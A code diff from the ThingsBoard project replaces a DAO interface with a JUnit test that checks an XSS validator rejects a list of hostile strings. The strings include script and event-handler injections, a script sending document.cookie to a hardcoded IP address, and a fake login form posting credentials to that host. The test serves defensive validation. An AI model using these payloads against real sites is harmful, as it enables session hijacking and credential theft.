@@ -28,28 +28,40 @@
  * DOES NOT CONVEY OR IMPLY ANY RIGHTS TO REPRODUCE, DISCLOSE OR DISTRIBUTE ITS CONTENTS,
  * OR TO MANUFACTURE, USE, OR SELL ANYTHING THAT IT  MAY DESCRIBE, IN WHOLE OR IN PART.
  */
-package org.thingsboard.server.dao.resource;
+package org.thingsboard.server.dao.service;
 
-import org.thingsboard.server.common.data.Resource;
-import org.thingsboard.server.common.data.ResourceType;
-import org.thingsboard.server.common.data.id.TenantId;
-import org.thingsboard.server.common.data.page.PageData;
-import org.thingsboard.server.common.data.page.PageLink;
+import org.junit.jupiter.api.BeforeAll;
+import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.ValueSource;
 
-import java.util.List;
+import javax.validation.ConstraintValidatorContext;
 
-public interface ResourceDao {
+import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.mockito.Mockito.mock;
 
-    Resource saveResource(Resource resource);
+public class NoXssValidatorTest {
+    private static NoXssValidator validator;
 
-    Resource getResource(TenantId tenantId, ResourceType resourceType, String resourceId);
+    @BeforeAll
+    public static void beforeAll() {
+        validator = new NoXssValidator();
+        validator.initialize(null);
+    }
 
-    void deleteResource(TenantId tenantId, ResourceType resourceType, String resourceId);
+    @ParameterizedTest
+    @ValueSource(strings = {
+            "aboba<a href='a' onmouseover=alert(1337) style='font-size:500px'>666",
+            "9090<body onload=alert('xsssss')>90909",
+            "qwerty<script>new Image().src=\"http://192.168.149.128/bogus.php?output=\"+document.cookie;</script>yyy",
+            "bambam<script>alert(document.cookie)</script>",
+            "<p><a href=\"http://htmlbook.ru/example/knob.html\">Link!!!</a></p>1221",
+            "<h3>Please log in to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Log in\"></br>",
+            "   <img src= \"http://site.com/\"  >  ",
+            "123 <input type=text value=a onfocus=alert(1337) AUTOFOCUS>bebe",
+    })
+    public void testIsNotValid(String stringWithXss) {
+        boolean isValid = validator.isValid(stringWithXss, mock(ConstraintValidatorContext.class));
+        assertFalse(isValid);
+    }
 
-    PageData<Resource> findAllByTenantId(TenantId tenantId, PageLink pageLink);
-
-
-    List<Resource> findAllByTenantIdResourceType(TenantId tenantId, ResourceType resourceType);
-
-    void removeAllByTenantId(TenantId tenantId);
 }
